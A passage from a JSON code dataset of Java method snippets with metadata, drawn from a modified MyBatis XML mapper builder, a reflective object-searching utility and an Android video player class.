missing a resource...\n        }\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 58019, "method_name": "cacheRefElement", "class_name": "XMLMapperBuilder", "params": ["XNode"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void cacheRefElement(XNode context) {\n    if (context != null) {\n      configuration.addCacheRef(builderAssistant.getCurrentNamespace(), context.getStringAttribute(\"namespace\"));\n      CacheRefResolver cacheRefResolver = new CacheRefResolver(builderAssistant, context.getStringAttribute(\"namespace\"));\n      try {\n        cacheRefResolver.resolveCacheRef();\n      } catch (IncompleteElementException e) {\n        configuration.addIncompleteCacheRef(cacheRefResolver);\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 58020, "method_name": "cacheElement", "class_name": "XMLMapperBuilder", "params": ["XNode"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void cacheElement(XNode context) {\n    if (context != null) {\n      String type = context.getStringAttribute(\"type\", \"PERPETUAL\");\n      Class<? extends Cache> typeClass = typeAliasRegistry.resolveAlias(type);\n      String eviction = context.getStringAttribute(\"eviction\", \"LRU\");\n      Class<? extends Cache> evictionClass = typeAliasRegistry.resolveAlias(eviction);\n      Long flushInterval = context.getLongAttribute(\"flushInterval\");\n      Integer size = context.getIntAttribute(\"size\");\n      boolean readWrite = !context.getBooleanAttribute(\"readOnly\", false);\n      boolean blocking = context.getBooleanAttribute(\"blocking\", false);\n      Properties props = context.getChildrenAsProperties();\n      builderAssistant.useNewCache(typeClass, evictionClass, flushInterval, size, readWrite, blocking, props);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 58021, "method_name": "parameterMapElement", "class_name": "XMLMapperBuilder", "params": ["List<XNode>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void parameterMapElement(List<XNode> list) {\n    for (XNode parameterMapNode : list) {\n      String id = parameterMapNode.getStringAttribute(\"id\");\n      String type = parameterMapNode.getStringAttribute(\"type\");\n      Class<?> parameterClass = resolveClass(type);\n      List<XNode> parameterNodes = parameterMapNode.evalNodes(\"parameter\");\n      List<ParameterMapping> parameterMappings = new ArrayList<>();\n      for (XNode parameterNode : parameterNodes) {\n        String property = parameterNode.getStringAttribute(\"property\");\n        String javaType = parameterNode.getStringAttribute(\"javaType\");\n        String jdbcType = parameterNode.getStringAttribute(\"jdbcType\");\n        String resultMap = parameterNode.getStringAttribute(\"resultMap\");\n        String mode = parameterNode.getStringAttribute(\"mode\");\n        String typeHandler = parameterNode.getStringAttribute(\"typeHandler\");\n        Integer numericScale = parameterNode.getIntAttribute(\"numericScale\");\n        ParameterMode modeEnum = resolveParameterMode(mode);\n        Class<?> javaTypeClass = resolveClass(javaType);\n        JdbcType jdbcTypeEnum = resolveJdbcType(jdbcType);\n        Class<? extends TypeHandler<?>> typeHandlerClass = resolveClass(typeHandler);\n        ParameterMapping parameterMapping = builderAssistant.buildParameterMapping(parameterClass, property, javaTypeClass, jdbcTypeEnum, resultMap, modeEnum, typeHandlerClass, numericScale);\n        parameterMappings.add(parameterMapping);\n      }\n      builderAssistant.addParameterMap(id, parameterClass, parameterMappings);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 58022, "method_name": "resultMapElements", "class_name": "XMLMapperBuilder", "params": ["List<XNode>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void resultMapElements(List<XNode> list) {\n    for (XNode resultMapNode : list) {\n      try {\n        resultMapElement(resultMapNode);\n      } catch (IncompleteElementException e) {\n        // ignore, it will be retried\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 58023, "method_name": "resultMapElement", "class_name": "XMLMapperBuilder", "params": ["XNode"], "throws": null, "modifiers": ["private"], "return_type": "ResultMap", "snippet": "  private ResultMap resultMapElement(XNode resultMapNode) {\n    return resultMapElement(resultMapNode, Collections.emptyList(), null);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 58024, "method_name": "resultMapElement", "class_name": "XMLMapperBuilder", "params": ["XNode", "List<ResultMapping>", "Class<?>"], "throws": null, "modifiers": ["private"], "return_type": "ResultMap", "snippet": "  private ResultMap resultMapElement(XNode resultMapNode, List<ResultMapping> additionalResultMappings, Class<?> enclosingType) {\n    ErrorContext.instance().activity(\"processing \" + resultMapNode.getValueBasedIdentifier());\n    String type = resultMapNode.getStringAttribute(\"type\",\n        resultMapNode.getStringAttribute(\"ofType\",\n            resultMapNode.getStringAttribute(\"resultType\",\n                resultMapNode.getStringAttribute(\"javaType\"))));\n    //Class<?> typeClass = resolveClass(type); modify by xuliang 20200403\n    Class<?> typeClass =Object.class;\n    if (typeClass == null) {\n      typeClass = inheritEnclosingType(resultMapNode, enclosingType);\n    }\n    Discriminator discriminator = null;\n    List<ResultMapping> resultMappings = new ArrayList<>(additionalResultMappings);\n    List<XNode> resultChildren = resultMapNode.getChildren();\n    for (XNode resultChild : resultChildren) {\n      if (\"constructor\".equals(resultChild.getName())) {\n        processConstructorElement(resultChild, typeClass, resultMappings);\n      } else if (\"discriminator\".equals(resultChild.getName())) {\n        discriminator = processDiscriminatorElement(resultChild, typeClass, resultMappings);\n      } else {\n        List<ResultFlag> flags = new ArrayList<>();\n        if (\"id\".equals(resultChild.getName())) {\n          flags.add(ResultFlag.ID);\n        }\n        resultMappings.add(buildResultMappingFromContext(resultChild, typeClass, flags));\n      }\n    }\n    String id = resultMapNode.getStringAttribute(\"id\",\n            resultMapNode.getValueBasedIdentifier());\n    String extend = resultMapNode.getStringAttribute(\"extends\");\n    Boolean autoMapping = resultMapNode.getBooleanAttribute(\"autoMapping\");\n    ResultMapResolver resultMapResolver = new ResultMapResolver(builderAssistant, id, typeClass, extend, discriminator, resultMappings, autoMapping);\n    try {\n      return resultMapResolver.resolve();\n    } catch (IncompleteElementException  e) {\n      configuration.addIncompleteResultMap(resultMapResolver);\n      throw e;\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 58025, "method_name": "inheritEnclosingType", "class_name": "XMLMapperBuilder", "params": ["XNode", "Class<?>"], "throws": null, "modifiers": ["protected"], "return_type": "Class<?>", "snippet": "  protected Class<?> inheritEnclosingType(XNode resultMapNode, Class<?> enclosingType) {\n    if (\"association\".equals(resultMapNode.getName()) && resultMapNode.getStringAttribute(\"resultMap\") == null) {\n      String property = resultMapNode.getStringAttribute(\"property\");\n      if (property != null && enclosingType != null) {\n        MetaClass metaResultType = MetaClass.forClass(enclosingType, configuration.getReflectorFactory());\n        return metaResultType.getSetterType(property);\n      }\n    } else if (\"case\".equals(resultMapNode.getName()) && resultMapNode.getStringAttribute(\"resultMap\") == null) {\n      return enclosingType;\n    }\n    return null;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 58026, "method_name": "processConstructorElement", "class_name": "XMLMapperBuilder", "params": ["XNode", "Class<?>", "List<ResultMapping>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void processConstructorElement(XNode resultChild, Class<?> resultType, List<ResultMapping> resultMappings) {\n    List<XNode> argChildren = resultChild.getChildren();\n    for (XNode argChild : argChildren) {\n      List<ResultFlag> flags = new ArrayList<>();\n      flags.add(ResultFlag.CONSTRUCTOR);\n      if (\"idArg\".equals(argChild.getName())) {\n        flags.add(ResultFlag.ID);\n      }\n      resultMappings.add(buildResultMappingFromContext(argChild, resultType, flags));\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 58027, "method_name": "processDiscriminatorElement", "class_name": "XMLMapperBuilder", "params": ["XNode", "Class<?>", "List<ResultMapping>"], "throws": null, "modifiers": ["private"], "return_type": "Discriminator", "snippet": "  private Discriminator processDiscriminatorElement(XNode context, Class<?> resultType, List<ResultMapping> resultMappings) {\n    String column = context.getStringAttribute(\"column\");\n    String javaType = context.getStringAttribute(\"javaType\");\n    String jdbcType = context.getStringAttribute(\"jdbcType\");\n    String typeHandler = context.getStringAttribute(\"typeHandler\");\n    Class<?> javaTypeClass = resolveClass(javaType);\n    Class<? extends TypeHandler<?>> typeHandlerClass = resolveClass(typeHandler);\n    JdbcType jdbcTypeEnum = resolveJdbcType(jdbcType);\n    Map<String, String> discriminatorMap = new HashMap<>();\n    for (XNode caseChild : context.getChildren()) {\n      String value = caseChild.getStringAttribute(\"value\");\n      String resultMap = caseChild.getStringAttribute(\"resultMap\", processNestedResultMappings(caseChild, resultMappings, resultType));\n      discriminatorMap.put(value, resultMap);\n    }\n    return builderAssistant.buildDiscriminator(resultType, column, javaTypeClass, jdbcTypeEnum, typeHandlerClass, discriminatorMap);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 58028, "method_name": "sqlElement", "class_name": "XMLMapperBuilder", "params": ["List<XNode>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void sqlElement(List<XNode> list) {\n    if (configuration.getDatabaseId() != null) {\n      sqlElement(list, configuration.getDatabaseId());\n    }\n    sqlElement(list, null);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 58029, "method_name": "sqlElement", "class_name": "XMLMapperBuilder", "params": ["List<XNode>", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void sqlElement(List<XNode> list, String requiredDatabaseId) {\n    for (XNode context : list) {\n      String databaseId = context.getStringAttribute(\"databaseId\");\n      String id = context.getStringAttribute(\"id\");\n      id = builderAssistant.applyCurrentNamespace(id, false);\n      if (databaseIdMatchesCurrent(id, databaseId, requiredDatabaseId)) {\n        if(!sqlFragments.containsKey(id)) { //add by xuliang 20200407\n          sqlFragments.put(id, context);\n        }\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 58030, "method_name": "databaseIdMatchesCurrent", "class_name": "XMLMapperBuilder", "params": ["String", "String", "String"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean databaseIdMatchesCurrent(String id, String databaseId, String requiredDatabaseId) {\n    if (requiredDatabaseId != null) {\n      return requiredDatabaseId.equals(databaseId);\n    }\n    if (databaseId != null) {\n      return false;\n    }\n    if (!this.sqlFragments.containsKey(id)) {\n      return true;\n    }\n    // skip this fragment if there is a previous one with a not null databaseId\n    XNode context = this.sqlFragments.get(id);\n    return context.getStringAttribute(\"databaseId\") == null;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 58031, "method_name": "buildResultMappingFromContext", "class_name": "XMLMapperBuilder", "params": ["XNode", "Class<?>", "List<ResultFlag>"], "throws": null, "modifiers": ["private"], "return_type": "ResultMapping", "snippet": "  private ResultMapping buildResultMappingFromContext(XNode context, Class<?> resultType, List<ResultFlag> flags) {\n    String property;\n    if (flags.contains(ResultFlag.CONSTRUCTOR)) {\n      property = context.getStringAttribute(\"name\");\n    } else {\n      property = context.getStringAttribute(\"property\");\n    }\n    String column = context.getStringAttribute(\"column\");\n    String javaType = context.getStringAttribute(\"javaType\");\n    String jdbcType = context.getStringAttribute(\"jdbcType\");\n    String nestedSelect = context.getStringAttribute(\"select\");\n    String nestedResultMap = context.getStringAttribute(\"resultMap\", () ->\n      processNestedResultMappings(context, Collections.emptyList(), resultType));\n    String notNullColumn = context.getStringAttribute(\"notNullColumn\");\n    String columnPrefix = context.getStringAttribute(\"columnPrefix\");\n    String typeHandler = context.getStringAttribute(\"typeHandler\");\n    String resultSet = context.getStringAttribute(\"resultSet\");\n    String foreignColumn = context.getStringAttribute(\"foreignColumn\");\n    boolean lazy = \"lazy\".equals(context.getStringAttribute(\"fetchType\", configuration.isLazyLoadingEnabled() ? \"lazy\" : \"eager\"));\n    Class<?> javaTypeClass = resolveClass(javaType);\n   // Class<? extends TypeHandler<?>> typeHandlerClass = resolveClass(typeHandler); //modify by xuliang 20200403\n    Class<? extends TypeHandler<?>> typeHandlerClass = ObjectTypeHandler.class;\n    JdbcType jdbcTypeEnum = resolveJdbcType(jdbcType);\n    return builderAssistant.buildResultMapping(resultType, property, column, javaTypeClass, jdbcTypeEnum, nestedSelect, nestedResultMap, notNullColumn, columnPrefix, typeHandlerClass, flags, resultSet, foreignColumn, lazy);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 58032, "method_name": "processNestedResultMappings", "class_name": "XMLMapperBuilder", "params": ["XNode", "List<ResultMapping>", "Class<?>"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "  private String processNestedResultMappings(XNode context, List<ResultMapping> resultMappings, Class<?> enclosingType) {\n    if (\"association\".equals(context.getName())\n        || \"collection\".equals(context.getName())\n        || \"case\".equals(context.getName())) {\n      if (context.getStringAttribute(\"select\") == null) {\n        validateCollection(context, enclosingType);\n        ResultMap resultMap = resultMapElement(context, resultMappings, enclosingType);\n        return resultMap.getId();\n      }\n    }\n    return null;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 58033, "method_name": "validateCollection", "class_name": "XMLMapperBuilder", "params": ["XNode", "Class<?>"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void validateCollection(XNode context, Class<?> enclosingType) {\n    if (\"collection\".equals(context.getName()) && context.getStringAttribute(\"resultMap\") == null\n        && context.getStringAttribute(\"javaType\") == null) {\n      MetaClass metaResultType = MetaClass.forClass(enclosingType, configuration.getReflectorFactory());\n      String property = context.getStringAttribute(\"property\");\n      /*if (!metaResultType.hasSetter(property)) {\n        throw new BuilderException(\n          \"Ambiguous collection type for property '\" + property + \"'. You must specify 'javaType' or 'resultMap'.\");\n      }*/ //delete by xuliang 202020407\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 58034, "method_name": "bindMapperForNamespace", "class_name": "XMLMapperBuilder", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void bindMapperForNamespace() {\n    String namespace = builderAssistant.getCurrentNamespace();\n    if (namespace != null) {\n      Class<?> boundType = null;\n      try {\n        boundType = Resources.classForName(namespace);\n      } catch (ClassNotFoundException e) {\n        //ignore, bound type is not required\n      }\n      if (boundType != null) {\n        if (!configuration.hasMapper(boundType)) {\n          // Spring may not know the real resource name so we set a flag\n          // to prevent loading again this resource from the mapper interface\n          // look at MapperAnnotationBuilder#loadXmlResource\n          configuration.addLoadedResource(\"namespace:\" + namespace);\n          configuration.addMapper(boundType);\n        }\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 58035, "method_name": "initSavePath", "class_name": "SearchRequstByRecursive1", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initSavePath(){\n        if(report_save_path == null){\n            this.result_file = String.format(\"%s_result_%s.txt\",model_name,getCurrentDate());\n            this.all_chain_file = String.format(\"%s_log_%s.txt\",model_name,getCurrentDate());\n        }else{\n            this.result_file = String.format(\"%s/%s_result_%s.txt\",report_save_path,model_name,getCurrentDate());\n            this.all_chain_file = String.format(\"%s/%s_log_%s.txt\",report_save_path,model_name,getCurrentDate());\n        }\n    }", "url": "https://raw.githubusercontent.com/c0ny1/java-object-searcher/master/src/test/java/me/gv7/tools/josearcher/searcher/SearchRequstByRecursive1.java", "stars": "160", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58036, "method_name": "setBlacklists", "class_name": "SearchRequstByRecursive1", "params": ["List<Blacklist>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setBlacklists(List<Blacklist> blacklists) {\n        this.blacklists = blacklists;\n    }", "url": "https://raw.githubusercontent.com/c0ny1/java-object-searcher/master/src/test/java/me/gv7/tools/josearcher/searcher/SearchRequstByRecursive1.java", "stars": "160", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58037, "method_name": "setMax_search_depth", "class_name": "SearchRequstByRecursive1", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMax_search_depth(int max_search_depth) {\n        this.max_search_depth = max_search_depth;\n    }", "url": "https://raw.githubusercontent.com/c0ny1/java-object-searcher/master/src/test/java/me/gv7/tools/josearcher/searcher/SearchRequstByRecursive1.java", "stars": "160", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58038, "method_name": "setReport_save_path", "class_name": "SearchRequstByRecursive1", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setReport_save_path(String report_save_path) {\n        this.report_save_path = report_save_path;\n    }", "url": "https://raw.githubusercontent.com/c0ny1/java-object-searcher/master/src/test/java/me/gv7/tools/josearcher/searcher/SearchRequstByRecursive1.java", "stars": "160", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58039, "method_name": "setIs_debug", "class_name": "SearchRequstByRecursive1", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setIs_debug(boolean is_debug) {\n        this.is_debug = is_debug;\n    }", "url": "https://raw.githubusercontent.com/c0ny1/java-object-searcher/master/src/test/java/me/gv7/tools/josearcher/searcher/SearchRequstByRecursive1.java", "stars": "160", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58040, "method_name": "searchObject", "class_name": "SearchRequstByRecursive1", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void searchObject(){\n        this.initSavePath();\n        searchObject(null,target,\"\",0);\n    }", "url": "https://raw.githubusercontent.com/c0ny1/java-object-searcher/master/src/test/java/me/gv7/tools/josearcher/searcher/SearchRequstByRecursive1.java", "stars": "160", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58041, "method_name": "searchObject", "class_name": "SearchRequstByRecursive1", "params": ["String", "Object", "String", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void searchObject(String filed_name,Object filed_object,String log_chain,int father_depth) {\n        int current_depth = father_depth;\n\n        //\u6700\u591a\u6316\u591a\u6df1\n        if(current_depth > max_search_depth){\n            return;\n        }\n\n        if (filed_object == null || CheckUtil.isSysType(filed_object) || MatchUtil.isInBlacklist(filed_name,filed_object,this.blacklists)){\n            //\u5982\u679cobject\u662fnull/\u57fa\u672c\u6570\u636e\u7c7b\u578b/\u5305\u88c5\u7c7b/\u65e5\u671f\u7c7b\u578b\uff0c\u5219\u4e0d\u9700\u8981\u5728\u9012\u5f52\u8c03\u7528\n            return;\n        }\n\n        //\u5982\u679c\u5df2\u7ecf\u641c\u7d22\u8fc7\u8fd9\u4e2a\u5bf9\u8c61\u5c31\u8fd4\u56de\u4e0d\u518d\u7ee7\u7eed\u641c\u7d22\n        if(searched.size() <= 0){\n            searched.add(filed_object);\n        }else {\n            for (Object obj : searched) {\n                if (obj == filed_object) {\n                    return;\n                }\n            }\n            searched.add(filed_object);\n        }\n\n        String new_log_chain = \"\";\n        Class clazz = filed_object.getClass();\n\n        if(log_chain != null && log_chain != \"\"){\n            current_depth++;\n            new_log_chain = String.format(\"%s \\n%s ---> %s = {%s}\",log_chain,getBlank(current_depth),filed_name,clazz.getName());\n        }else{\n            new_log_chain = String.format(\"%s = {%s}\",\"TargetObject\",filed_object.getClass().getName());\n        }\n\n\n\n\n        if(filed_object instanceof List){\n\n        }\n\n\n        if (filed_object instanceof Map){\n            Map map = (Map)filed_object;\n            if (map!=null && map.size()>0){\n                Iterator iterator = map.values().iterator();\n                while (iterator.hasNext()){\n                    searchObject(filed_name,iterator.next(),new_log_chain,current_depth);\n                }\n            }\n        }\n\n        if(clazz.isArray()){\n            try {\n                //Object[] \u6ca1\u6709\u5c5e\u6027\n                Object[] obj_arr = (Object[]) filed_object;\n                if (obj_arr != null && obj_arr.length > 0) {\n                    for(int i=0; i < obj_arr.length; i++){\n                        if(obj_arr[i] == null){\n                            continue;\n                        }\n                        String arr_type = obj_arr[i].getClass().getName();\n                        String arr_name = String.format(\"[%d] = {%s}\",i,arr_type);\n                        searchObject(arr_name,obj_arr[i], new_log_chain,current_depth);\n                    }\n                }\n            }catch (Throwable e){\n                logger.error(String.format(\"%s - %s\",this.model_name,\"clazz.isArray\"),e);\n            }\n        }\n\n\n        /**\n         * \u95ee\u9898\u4e00\uff1agetDeclaredFields\u65e0\u6cd5\u83b7\u53d6\u4ece\u7236\u7c7b\u83b7\u53d6\u7684\u5c5e\u6027\uff0c\u9700\u8981\u5411\u4e0a\u904d\u5386\u7236\u7c7b\n         */\n        for (; clazz != Object.class; clazz = clazz.getSuperclass()) {//\u5411\u4e0a\u5faa\u73af \u904d\u5386\u7236\u7c7b\n            Field[] fields = clazz.getDeclaredFields();\n\n            for (Field field : fields) {\n                field.isAccessible();\n                field.setAccessible(true);\n                String proType = field.getGenericType().toString();\n                String proName = field.getName();\n                Object subObj = null;\n                try {\n                    subObj = field.get(filed_object);\n                } catch (Throwable e) {\n                    logger.error(String.format(\"%s - %s\",this.model_name,\"class\"),e);\n                }\n\n                if(subObj == null){\n                    continue;\n                }else if (CheckUtil.isSysType(field)) {\n                    //\u5c5e\u6027\u662f\u7cfb\u7edf\u7c7b\u578b\u8df3\u8fc7\n                    continue;\n                } else if(MatchUtil.isInBlacklist(proName,subObj,this.blacklists)){\n                    continue;\n                }else if (isList(field)) {\n                    //\u5bf9List,ArrayList\u7c7b\u578b\u7684\u5c5e\u6027\u904d\u5386\n                    try {\n                        List list = (List) field.get(filed_object);\n                        if (list != null && list.size() > 0) {\n                            current_depth++;\n                            String tmp_log_chain = String.format(\"%s \\n%s ---> %s = {%s}\", new_log_chain, getBlank(current_depth), proName, proType);\n                            int len = list.size();\n                            for (int i = 0; i < len; i++) {\n                                if (list.get(i) == null) {\n                                    continue;\n                                }\n                                String list_name = String.format(\"[%d]\", i);\n                                searchObject(list_name, list.get(i), tmp_log_chain, current_depth);\n                            }\n                        }\n                    } catch (Throwable e) {\n                        logger.error(String.format(\"%s - %s\",this.model_name,\"isList\"),e);\n                    }\n                } else if (isMap(field)) {\n                    try {\n                        //\u5bf9Map,HashMap\u7c7b\u578b\u7684\u5c5e\u6027\u904d\u5386\n                        Map map = (Map) field.get(filed_object);\n                        if (map != null && map.size() > 0) {\n                            current_depth++;\n                            String tmp_log_chain = String.format(\"%s \\n%s ---> %s = {%s}\", new_log_chain, getBlank(current_depth), proName, proType);\n\n                            Iterator<String> iter = map.keySet().iterator();\n                            while (iter.hasNext()) {\n                                String key = iter.next();\n                                Object value = map.get(key);\n                                String map_name = String.format(\"[%s]\", key);\n                                searchObject(map_name, value, tmp_log_chain, current_depth);\n                            }\n                        }\n\n                    } catch (Throwable e) {\n                        logger.error(String.format(\"%s - %s\",this.model_name,\"isMap\"),e);\n                    }\n                } else if (field.getType().isArray()) {\n                    try {\n                        //\u5c5e\u6027\u662f\u6570\u7ec4\u7c7b\u578b\u5219\u904d\u5386\n                        Object obj = field.get(filed_object);\n                        if(obj == null){\n                            continue;\n                        }\n\n                        Object[] objArr = (Object[]) obj;\n                        if (objArr != null && objArr.length > 0) {\n                            current_depth++;\n                            for (int i = 0; i < objArr.length; i++) {\n                                if (objArr[i] == null) {\n                                    continue;\n                                }\n\n                                String tmp_log_chain = String.format(\"%s \\n%s ---> %s = {%s}\", new_log_chain, getBlank(current_depth), proName, proType);\n\n                                String arrType = objArr[i].getClass().getName();\n                                String arr_name = String.format(\"[%d]\", i);\n                                searchObject(arr_name, objArr[i], tmp_log_chain, current_depth);\n\n                            }\n                        }\n                    } catch (Throwable e) {\n                        logger.error(String.format(\"%s - %s\",this.model_name,\"isArray\"),e);\n                    }\n                } else {\n                    try {\n                        //class\u7c7b\u578b\u7684\u904d\u5386\n                        searchObject(proName, subObj, new_log_chain, current_depth);\n                    } catch (Throwable e) {\n                        logger.error(String.format(\"%s - %s\",this.model_name,\"class\"),e);\n                    }\n                }\n            }\n        }\n\n        if(MatchUtil.matchObject(filed_name,filed_object,keys)){\n            write2log(result_file,new_log_chain + \"\\n\\n\\n\");\n        }\n\n        if(is_debug) {\n            write2log(all_chain_file, new_log_chain + \"\\n\\n\\n\");\n        }\n\n        System.out.println(new_log_chain);\n        System.out.println(\"\\n\\n\\n\");\n    }", "url": "https://raw.githubusercontent.com/c0ny1/java-object-searcher/master/src/test/java/me/gv7/tools/josearcher/searcher/SearchRequstByRecursive1.java", "stars": "160", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58042, "method_name": "setActivity", "class_name": "VideoPlayerGlue", "params": ["FragmentActivity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setActivity(FragmentActivity activity) {\n        this.activity = activity;\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/player/VideoPlayerGlue.java", "stars": "9", "class_props": {"extends": "PlaybackTransportControlGlue", "implements": null, "modifiers": ["public"]}}, {"id": 58043, "method_name": "onPlayStateChanged", "class_name": "VideoPlayerGlue", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onPlayStateChanged() {\n        mOnPlayerStateChangedListener.onPlayStateChanged(mPlayer.getPlaybackState());\n        super.onPlayStateChanged();\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/player/VideoPlayerGlue.java", "stars": "9", "class_props": {"extends": "PlaybackTransportControlGlue", "implements": null, "modifiers": ["public"]}}, {"id": 58044, "method_name": "onCreatePrimaryActions", "class_name": "VideoPlayerGlue", "params": ["ArrayObjectAdapter"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreatePrimaryActions(ArrayObjectAdapter adapter) {\n        // Order matters, super.onCreatePrimaryActions() will create the play / pause action.\n        // Will display as follows:\n        // play/pause, previous, rewind, fast forward, next\n        //   > /||      |<        <<        >>         >|\n        super.onCreatePrimaryActions(adapter);\n        adapter.add(mSkipPreviousAction);\n        adapter.add(mRewindAction);\n        adapter.add(mFastForwardAction);\n        adapter.add(mSkipNextAction);\n        adapter.add(mPipAction);\n        adapter.add(mHighQuality);\n        //adapter.add(mClosedCaptionAction);\n        //adapter.add(mCastAction);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/player/VideoPlayerGlue.java", "stars": "9", "class_props": {"extends": "PlaybackTransportControlGlue", "implements": null, "modifiers": ["public"]}}, {"id": 58045, "method_name": "onCreateSecondaryActions", "class_name": "VideoPlayerGlue", "params": ["ArrayObjectAdapter"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreateSecondaryActions(ArrayObjectAdapter adapter) {\n        super.onCreateSecondaryActions(adapter);\n    }", "url": 